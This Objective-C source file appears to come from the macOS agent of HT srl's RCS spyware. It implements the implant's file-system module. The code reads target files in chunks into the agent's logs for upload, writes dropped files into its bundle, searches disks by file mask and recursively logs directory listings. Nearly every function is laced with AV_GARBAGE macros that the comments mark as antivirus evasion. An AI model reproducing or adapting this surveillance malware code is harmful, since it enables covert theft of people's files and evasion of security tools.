/*
 *  RCSMFileSystemManager.m
 *  RCSMac
 *
 *
 *  Created by revenge on 1/27/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */
#import "RCSMCommon.h"

#import "RCSMFileSystemManager.h"

#import "RCSMLogManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#define FS_MAX_DOWNLOAD_FILE_SIZE (100 * 1024 * 1024)
#define FS_MAX_UPLOAD_CHUNK_SIZE  (25 *  1024 * 1024)


@interface __m_MFileSystemManager (private)

- (NSMutableData *)_generateLogDataForPath: (NSString *)aPath
                               isDirectory: (BOOL)isDirectory
                                   isEmpty: (BOOL)isEmpty;

@end

@implementation __m_MFileSystemManager (private)

- (NSMutableData *)_generateLogDataForPath: (NSString *)aPath
                               isDirectory: (BOOL)isDirectory
                                   isEmpty: (BOOL)isEmpty
{
  NSMutableData *logData        = [[NSMutableData alloc] init];
  NSMutableData *rawHeader      = [[NSMutableData alloc]
                                   initWithLength: sizeof(fileSystemHeader)];
  fileSystemHeader *logHeader   = (fileSystemHeader *)[rawHeader bytes];
  logHeader->flags              = 0;
  short unicodeNullTerminator   = 0x0000;
  
  NSDictionary *fileAttributes  = [[NSFileManager defaultManager]
                                   attributesOfItemAtPath: aPath
                                                    error: nil];
  uint64_t fileSize  = (uint64_t)[[fileAttributes objectForKey: NSFileSize]
                                  unsignedLongLongValue];
  int64_t filetime;
  time_t unixTime;
  time(&unixTime);
  
  filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  
  if (isDirectory)
    {
      logHeader->flags |= FILESYSTEM_IS_DIRECTORY;
    }
  if (isEmpty)
    {
      logHeader->flags |= FILESYSTEM_IS_EMPTY;
    }
  
  logHeader->version      = LOG_FILESYSTEM_VERSION;
  logHeader->pathLength   = [aPath lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                            + sizeof(unicodeNullTerminator);
  logHeader->fileSizeLo   = fileSize & 0xFFFFFFFF;
  logHeader->fileSizeHi   = fileSize >> 32;
  logHeader->timestampLo  = filetime & 0xFFFFFFFF;
  logHeader->timestampHi  = filetime >> 32;
  
  [logData appendData: rawHeader];
  [logData appendData: [aPath dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [logData appendBytes: &unicodeNullTerminator
                length: sizeof(short)];
  
  [rawHeader release];
  return [logData autorelease];
}

@end


@implementation __m_MFileSystemManager

- (BOOL)logFileAtPath: (NSString *)aFilePath forAgentID: (uint32_t)agentID
{
  logDownloadHeader *additionalHeader;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  u_int numOfTotalChunks  = 1;
  u_int currentChunk      = 1;
  u_int currentChunkSize  = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSDictionary *fileAttributes;
  fileAttributes = [[NSFileManager defaultManager]
                    attributesOfItemAtPath: aFilePath
                    error: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  u_int fileSize = [[fileAttributes objectForKey: NSFileSize] unsignedIntValue];
  numOfTotalChunks = fileSize / FS_MAX_UPLOAD_CHUNK_SIZE + 1;
  NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aFilePath]; 
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
#ifdef DEBUG_FS_MANAGER
  warnLog(@"numOfTotalChunks: %d", numOfTotalChunks);
#endif
  
  //
  // Do while filesize is > 0
  // in order to split the file in FS_MAX_UPLOAD_CHUNK_SIZE
  //
  do
  {  
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    u_int fileNameLength = 0;
    NSString *fileName;
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    if (numOfTotalChunks > 1)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      fileName = [[NSString alloc] initWithFormat: @"%@ [%d of %d]",
                  aFilePath,
                  currentChunk,
                  numOfTotalChunks];
    }
    else
    {  
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      fileName = [[NSString alloc] initWithString: aFilePath];
    }
    
#ifdef DEBUG_FS_MANAGER
    warnLog(@"%@ with size (%d)", fileName, fileSize);
#endif
    
    currentChunkSize = fileSize;
    if (currentChunkSize > FS_MAX_UPLOAD_CHUNK_SIZE)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      currentChunkSize = FS_MAX_UPLOAD_CHUNK_SIZE;
    }
    
#ifdef DEBUG_FS_MANAGER
    warnLog(@"currentChunkSize: %d", currentChunkSize);
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    fileSize -= currentChunkSize;
    currentChunk++;
    fileNameLength = [fileName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    //
    // Fill in the agent additional header
    //
    NSMutableData *rawAdditionalHeader = [NSMutableData dataWithLength:
                                          sizeof(logDownloadHeader) + fileNameLength];
    additionalHeader = (logDownloadHeader *)[rawAdditionalHeader bytes];
    additionalHeader->version         = LOG_FILE_VERSION;
    additionalHeader->fileNameLength  = [fileName lengthOfBytesUsingEncoding:
                                         NSUTF16LittleEndianStringEncoding];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    @try
    {  
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(logDownloadHeader), fileNameLength)
                                     withBytes: [[fileName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
    }
    @catch (NSException *e)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"Exception on replaceBytesInRange makerange");
#endif
      [fileName release];
      [innerPool release];
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    BOOL success = [logManager createLog: agentID
                             agentHeader: rawAdditionalHeader
                               withLogID: 0];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    if (success == FALSE)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"createLog failed");
#endif
      
      [fileName release];
      [innerPool release];
      return FALSE;
    }  
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    NSData *_fileData = nil;
    
    if ((_fileData = [fileHandle readDataOfLength: currentChunkSize]) == nil)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"Error while reading file");
#endif
      
      [fileName release];
      [innerPool release];
      return FALSE;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    NSMutableData *fileData = [[NSMutableData alloc] initWithData: _fileData];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    if ([logManager writeDataToLog: fileData
                          forAgent: agentID
                         withLogID: 0] == FALSE)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"Error while writing data to log");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      [fileData release];
      [fileName release];
      [innerPool release];
      return FALSE;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    if ([logManager closeActiveLog: agentID
                         withLogID: 0] == FALSE)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"Error while closing activeLog");
#endif
      [fileData release];
      [fileName release];
      [innerPool release];
      return FALSE;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [fileData release];
    [fileName release];
    [innerPool drain];
  }
  while (fileSize > 0);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [fileHandle closeFile];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return YES;
}


- (BOOL)createFile: (NSString *)aFileName withData: (NSData *)aFileData
{
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSString *filePath = [NSString stringWithFormat: @"%@/%@",
                        [[NSBundle mainBundle] bundlePath],
                        aFileName];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([aFileData length] > FS_MAX_DOWNLOAD_FILE_SIZE)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"file too big! (>%d)", FS_MAX_DOWNLOAD_FILE_SIZE);
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  return [aFileData writeToFile: filePath
                     atomically: YES];
}

- (NSArray *)searchFilesOnHD: (NSString *)aFileMask
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSFileManager *_fileManager = [NSFileManager defaultManager];
  NSString *filePath          = [aFileMask stringByDeletingLastPathComponent];
  NSString *fileNameToMatch   = [aFileMask lastPathComponent];
  NSMutableArray *filesFound  = [[NSMutableArray alloc] init];
  
	BOOL isDir                  = NO;
  int i                       = 0;
  
	[_fileManager fileExistsAtPath: filePath
                     isDirectory: &isDir];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (isDir == TRUE)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_006
    
      NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: filePath
                                                              error: nil];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
      int filesCount = [dirContent count];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
      for (i = 0; i < filesCount; i++)
      {  
        // AV evasion: only on release build
        AV_GARBAGE_000
        
          NSString *fileName = [dirContent objectAtIndex: i];
        
        // AV evasion: only on release build
        AV_GARBAGE_002
        
          if (matchPattern([fileName UTF8String],
                           [fileNameToMatch UTF8String]))
          {  
            // AV evasion: only on release build
            AV_GARBAGE_009
            
              NSString *foundFilePath = [NSString stringWithFormat: @"%@/%@", filePath, fileName];
              [filesFound addObject: foundFilePath];
            }
        }
    }
  
  if ([filesFound count] > 0)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_001
    
      [outerPool release];
      return [filesFound autorelease];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [filesFound release];
  [outerPool release];
  return nil;
}

- (BOOL)logDirContent: (NSString *)aDirPath withDepth: (uint32_t)aDepth
{  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (aDepth == 0)
  {
#ifdef DEBUG_FS_MANAGER
    infoLog(@"depth is zero, returning");
#endif
    return TRUE;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSFileManager *_fileManager   = [NSFileManager defaultManager];
  BOOL isDir                    = NO;
  int i                         = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if ([aDirPath length] > 2)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    NSString *lastChar = [aDirPath substringWithRange: NSMakeRange([aDirPath length] - 1, 1)];
    
    if ([lastChar isEqualToString: @"*"])
    {
      aDirPath = [aDirPath substringWithRange: NSMakeRange(0, [aDirPath length] - 1)];
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    NSString *firstChars = [aDirPath substringWithRange: NSMakeRange(0, 2)];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    if ([firstChars isEqualToString: @"//"])
    {  
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      aDirPath = [aDirPath substringWithRange: NSMakeRange(1, [aDirPath length] - 1)];
    }
  }
  
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
	[_fileManager fileExistsAtPath: aDirPath
                     isDirectory: &isDir];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (isDir == TRUE)
  {
#ifdef DEBUG_FS_MANAGER
    infoLog(@"is dir: %@", aDirPath);
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    BOOL success = [logManager createLog: LOG_FILESYSTEM
                             agentHeader: nil
                               withLogID: 0];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    if (success == FALSE)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"createLog failed");
#endif
      
      [outerPool release];
      return FALSE;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: aDirPath
                                                            error: nil];
    int filesCount      = [dirContent count];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    NSMutableData *firstLogData = [self _generateLogDataForPath: aDirPath
                                                    isDirectory: YES
                                                        isEmpty: (filesCount > 0) ? NO : YES];
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    if ([logManager writeDataToLog: firstLogData
                          forAgent: LOG_FILESYSTEM
                         withLogID: 0] == FALSE)
    {
#ifdef DEBUG_FS_MANAGER
      errorLog(@"writeDataToLog firstLogData failed");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      [outerPool release];
      return FALSE;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
#ifdef DEBUG_FS_MANAGER
    infoLog(@"entries (%d)", filesCount);
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    for (i = 0; i < filesCount; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      NSString *fileName          = [dirContent objectAtIndex: i];
      NSMutableString *filePath   = [NSMutableString stringWithFormat: @"%@%@", aDirPath, fileName];
      BOOL isEmpty                = NO;
      BOOL isDir                  = NO;
      
      [_fileManager fileExistsAtPath: filePath
                         isDirectory: &isDir];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      // when set to 1 we need to recurse in the current subdir
      int recurse = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      if (isDir == TRUE)
      {
#ifdef DEBUG_FS_MANAGER
        infoLog(@"is subdir: %@", filePath);
#endif
        NSArray *subDirContent = [_fileManager contentsOfDirectoryAtPath: filePath
                                                                   error: nil];
        isDir = YES;
        
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        if ([subDirContent count] > 0)
        {
#ifdef DEBUG_FS_MANAGER
          infoLog(@"need to recurse on %@", filePath);
#endif
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          recurse = 1;
        }
        else
        {
#ifdef DEBUG_FS_MANAGER
          warnLog(@"is empty %@", filePath);
#endif  
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          isEmpty = YES;
        }
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      NSMutableData *logData = [self _generateLogDataForPath: filePath
                                                 isDirectory: isDir
                                                     isEmpty: isEmpty];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      if ([logManager writeDataToLog: logData
                            forAgent: LOG_FILESYSTEM
                           withLogID: 0] == FALSE)
      {
#ifdef DEBUG_FS_MANAGER
        errorLog(@"writeDataToLog failed");
#endif
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [innerPool release];
        [outerPool release];
        return FALSE;
      }
      
#ifdef DEBUG_FS_MANAGER
      infoLog(@"%@ logged", filePath);
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      if (recurse == 1)
      {  
        // AV evasion: only on release build
        AV_GARBAGE_001
        
#ifdef DEBUG_FS_MANAGER
        infoLog(@"recursing on %@", filePath);
#endif
        
        [filePath appendString: @"/"];
        [self logDirContent: filePath
                  withDepth: aDepth - 1];
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      [innerPool release];
    }
  }
  else
  {
#ifdef DEBUG_FS_MANAGER
    errorLog(@"Path not found or not a dir (%@)", aDirPath);
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    [outerPool release];
    return FALSE;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if ([logManager closeActiveLog: LOG_FILESYSTEM
                       withLogID: 0] == FALSE)
  {
#ifdef DEBUG_FS_MANAGER
    errorLog(@"closeActiveLog failed");
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [outerPool release];
    return FALSE;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [outerPool release];
  return TRUE;
}

@end
